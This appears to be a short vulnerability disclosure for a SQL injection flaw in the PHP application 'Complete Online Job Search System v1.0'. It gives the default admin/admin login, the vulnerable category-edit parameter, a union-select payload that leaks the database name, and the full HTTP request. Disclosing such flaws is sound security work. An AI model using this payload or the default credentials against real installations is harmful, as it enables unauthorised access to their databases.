# Complete Online Job Search System v1.0 has SQL injection

The password for the backend login account is: admin/admin

vendors: https://www.campcodes.com/projects/php/online-job-search-system-using-php-mysql-free-download/

Vulnerability File: /eris/admin/category/index.php?view=edit&id=

Vulnerability location: /eris/admin/category/index.php?view=edit&id=,id

Current database name: erisdb

[+] Payload: /eris/admin/category/index.php?view=edit&id=-24%27%20union%20select%201,database()--+ // Leak place ---> id

```sql
GET /eris/admin/category/index.php?view=edit&id=-24%27%20union%20select%201,database()--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=mho0fs263l0tis8l6v3lqpu6q4
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/170849198-b963b9b7-f687-4761-91e5-1883d0b10c36.png)

![image](https://user-images.githubusercontent.com/54017627/170849196-5ebee3d8-e7ac-415d-99c1-8443d94f63ea.png)
